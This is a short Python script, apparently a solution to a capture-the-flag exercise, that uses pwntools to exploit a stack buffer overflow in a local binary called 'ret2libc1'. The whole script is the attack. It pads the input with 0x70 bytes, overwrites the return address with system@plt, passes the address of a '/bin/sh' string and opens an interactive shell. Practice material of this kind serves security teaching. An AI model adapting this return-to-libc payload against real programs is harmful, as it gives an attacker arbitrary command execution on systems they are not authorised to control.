from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x8048460
payload = flat(['a' * 0x70, system_plt, 'a' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()